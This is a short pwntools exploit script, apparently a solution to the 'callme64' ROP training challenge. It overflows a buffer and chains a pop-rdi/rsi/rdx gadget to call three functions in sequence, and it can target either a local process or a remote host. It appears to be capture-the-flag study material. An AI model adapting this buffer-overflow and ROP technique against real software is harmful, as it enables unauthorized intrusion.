#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

#gdb_bool = True
gdb_bool = False

def exploit(r):

    call_one = 0x401850
    call_two = 0x401870
    call_three = 0x401810
    pppr = 0x000000000401ab0 #pop rdi;pop rsi;pop rdx;
    r.recvuntil("> ")
    buf = ""
    buf += "A"* cyclic_find("faaaaaaa",n=8)
    buf += p64(pppr)
    buf += p64(0x1)
    buf += p64(0x2)
    buf += p64(0x3)
    buf += p64(call_one)
    buf += p64(pppr)
    buf += p64(0x1)
    buf += p64(0x2)
    buf += p64(0x3)
    buf += p64(call_two)
    buf += p64(pppr)
    buf += p64(0x1)
    buf += p64(0x2)
    buf += p64(0x3)
    buf += p64(call_three)
    r.sendline(buf)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./callme64"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x401a56",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

